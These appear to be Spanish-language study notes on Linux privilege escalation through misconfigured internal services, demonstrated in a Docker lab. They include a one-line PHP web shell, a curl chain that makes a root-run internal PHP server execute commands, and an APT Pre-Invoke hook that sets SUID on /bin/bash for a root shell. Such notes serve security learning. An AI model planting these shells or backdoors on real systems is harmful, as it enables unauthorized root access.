-----
- Tags: #escalation #privilege 
-----
# Explicación

> Los **servicios internos** son componentes esenciales que operan en segundo plano dentro de un sistema operativo, encargándose de funciones críticas como la gestión de red, impresión, actualización de software y monitoreo del sistema, entre otros.

No obstante, si estos servicios **no están configurados adecuadamente** y se encuentran activos, pueden representar una brecha de seguridad significativa. Los atacantes podrían explotar estos servicios para obtener acceso no autorizado al sistema y llevar a cabo actividades malintencionadas.

Un ejemplo concreto sería un servicio de red mal configurado con permisos elevados. Si un atacante logra identificarlo y hallar una forma de aprovecharlo, podría utilizarlo para escalar privilegios y obtener acceso de administrador.

-----
# Ejemplos

Crearemos un contenedor de manera sencilla y rápida con los siguientes comandos

- ``docker pull ubuntu:latest``
- ``docker start --rm -dit -p80:80 --name ubuntuServer ubuntu``
- ``docker exec -it ubuntuServer bash``

Dentro del contenedor hacemos lo siguiente

- ``apt update``
- ``apt install apache2 php nano``
- ``service apache2 start``

## Ejemplo 1

En la ruta ``/var/www/html`` borraremos el **index.php** y crearemos un **cmd.php** para este ejemplo en el que podamos mediante un parámetro en la URL **ejecutar comandos**.

```php
<?php
	system($_GET['cmd'])
?>
```

![[AS 1.png]]

Lo normal es que **seamos un usuario no privilegiado** a la hora de ejecutar el comando, en este caso ``whoami``.

---------

Si nosotros realizamos un ``netstat -nat`` en la URL **no obtendremos información**, pero si convertimos el STDERR en STDOUT tal que ``netstat -nat 2>%261`` podremos, recordemos que ``%26`` es el símbolo ``&`` **URLencode**.

![[AS 2.png]]

Esto significa que no está instalada la herramienta ``netstat`` en el contenedor por lo tanto **la instalaremos** con ``apt install net-tools``. Una vez hecho lo anterior si vamos a la web y refrescamos veremos esto.

![[AS 3.png]]

Ahora vamos a la terminal en donde tenemos nuestro contenedor ejecutado y en el directorio ``/tmp/`` haremos un ``cp /var/www/html/cmd.php .`` para traernos el ``cmd.php`` al directorio actual ``/tmp/``. A continuación **montaremos un servidor** con php ``php -S 127.0.0.1:8000``, de esta forma al ejecutar el ``netstat -nat`` en la URL **podremos ver este servicio que corre internamente**, ya que si con ``nmap`` intentamos escanear el puerto *8000 (En donde se aloja el servicio)* nos dirá que está **cerrado** o **filtered**.

![[AS 4.png]]

También podríamos verlo con ``ps -faux``

![[AS 5.png]]

Imaginemos que esta web es de **la víctima**, si el servidor web tuviera instalado ``curl`` (Que en nuestro caso lo instalaremos en el contenedor para el ejemplo ``apt install curl`` podríamos hacer esto **en la URL** tal que así.

- ``http://localhost/cmd.php?cmd=curl localhost:8000/cmd.php?cmd=whoami``

Nosotros hacemos un ``curl`` como el usuario **www-data**, pero al realizarle una petición al servicio web montado por el usuario **root** por el *puerto 8000*, podemos aprovecharnos del **cmd.php** que hay para ejecutar comandos por su contenido no sanitizado, por lo tanto el comando ``whoami`` sería ejecutado como **root**. 

Es decir que:

- El primer uso del ``cmd.php?cmd=`` es del **cmd.php** que se encuentra en ``/var/www/html`` correspondiente al servicio web del usuario **www-data**
- El segundo uso del ``cmd.php?cmd`` es del **cmd.php** que se encuentra en el directorio ``/tmp/`` correspondiente al servicio web que montamos temporalmente con **php**, este fue ejecutado como usuario **root**.

==Recordemos que siempre ejecutaremos comandos en el servicio como el usuario que corre el servicio como tal==, por lo tanto pasamos de ejecutar el ``curl`` como **www-data** a ejecutar un ``whoami`` como **root**, porque abusamos de los servicios internos del sistema.

![[AS 6.png]]

Nosotros podríamos obtener el acceso al sistema desde un principio pero lo obtendríamos como el usuario **www-data** (No privilegiado), de esta forma lo podríamos conseguir como usuario **privilegiado (root)**

--------
## Ejemplo 2

Vamos a dirigirnos al directorio ``/etc/systemd/system/`` y ahí trataremos de **crear un servicio** que vamos a configurar de nuestro lado para que cada *30 segundos* ejecute un ``apt update``, similar a una tarea cron pero en este caso como **servicio**.

- ``nvim apt-update.service``

```
[Unit]
Description=Update package list

[Service]
Type=oneshot
ExecStart=/usr/bin/apt update
```

Ahora crearemos otro archivo que se encargará de **definir el tiempo de ejecución** del ``apt-update.service``, esto lo haremos tal que así

- ``nvim apt-update.timer``

```
[Unit]
Description=Update package list every 30 seconds

[Timer]
OnUnitActiveSec=30s
Unit=apt-update.service

[Install]
WantedBy=timers.target
```

Una vez tenemos estos dos archivos podemos **desplegarlos** con ``systemctl daemon-reload`` y luego haremos esto. 

- ``systemctl enable apt-update.timer``
- ``systemctl start apt-update.timer``
- ``systemctl enable apt-update.service``
- ``systemctl start apt-update.service``

Con esto ya **cada 30 segundos** se ejecutará el ``apt update`` en el sistema.

-----

Si nosotros estuviéramos como **un usuario no privilegiado**, en mi caso **c4sp** y hiciéramos un ``systemctl list-timers`` veríamos el ``apt-update.timer``.

Podemos ejecutar la herramienta ``pspy`` que en mi caso la tengo en el directorio ``/opt`` y ahí una vez se ejecute el ``apt update`` lo veríamos. 
Podemos ayudarnos de ``watch -n 1 systemctl list-timers`` para ver en tiempo real cuanto falta en ejecutar el servicio.

![[AS 7.png]]

Imaginemos que el directorio ``/etc/apt/apt.conf.d/`` **posee permisos de escritura** para *otros/others*, y que nosotros como atacantes estamos realizando un reconocimiento activo cuando encontramos con el comando ``systemctl list-timers`` que hay una tarea que ejecuta un ``apt update`` cada *30 segundos*, lo que podemos hacer es hacer uso de ``find / --name apt-update.service 2>/dev/null`` para ver donde se encuentra.

![[AS 8.png]]

De esta forma nosotros podríamos **ver el contenido del archivo** y confirmaríamos que es un ``apt update`` que se está ejecutando.

Tenemos que tener en cuenta que cuando se aplica una **actualización del sistema**, en caso de que nosotros tengamos **capacidad de escritura** en ciertas rutas como lo es ``/etc/apt/apt.conf.d/`` por ejemplo, podríamos definir ciertas políticas para indicar que tarea o que comando queremos que se ejecute **previo** a la actualización del sistema o al **final**, esto lo define un **PRE-INVOKE** y un **POST-INVOKE**, esto nos serviría para escalar privilegios en el sistema.

Crearemos un archivo en ``/etc/apt/apt.conf.d/`` llamado **01privesc**.

Si buscamos en **Google** ``apt update pre-invoke`` encontraremos este [recurso](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/)

![[AS 9.png]]

Nosotros lo **modificaremos** tal que así ``APT::Update::Pre-Invoke {"chmod u+s /bin/bash"; };`` y lo meteremos en el archivo **01privesc**, de esta manera el servicio antes de ejecutar el ``apt update``, le dará permisos **SUID** a la **bash**, por lo tanto podremos hacer uso de ``bash -p`` para volvernos **root**.